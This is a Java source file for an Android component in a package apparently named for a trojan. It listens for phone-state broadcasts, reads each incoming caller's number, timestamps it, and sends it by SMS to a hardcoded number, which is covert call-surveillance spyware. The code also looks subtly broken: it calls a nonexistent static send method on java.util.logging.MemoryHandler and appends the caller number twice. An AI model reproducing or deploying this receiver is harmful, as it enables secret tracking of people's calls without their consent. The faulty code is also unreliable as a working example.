package com.example.muma;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.MemoryHandler;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class CallHoldReceiver extends BroadcastReceiver {
	private final static String mACTION = "android.intent.action.PHONE_STATE";
	
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		if(intent.getAction().equals(mACTION)){
			Date date = new Date();
			date.setTime(System.currentTimeMillis());
			SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			StringBuilder smsCont = new StringBuilder();
			smsCont.append(format.format(date));
			smsCont.append("--");
			smsCont.append(intent.getExtras().getString("incoming_number"));
			smsCont.append("--");
			smsCont.append("callee");
			smsCont.append(intent.getExtras().getString("incoming_number"));
			MemoryHandler.send(MainActivity.PHONENO,smsCont.toString());
		}
	}
}
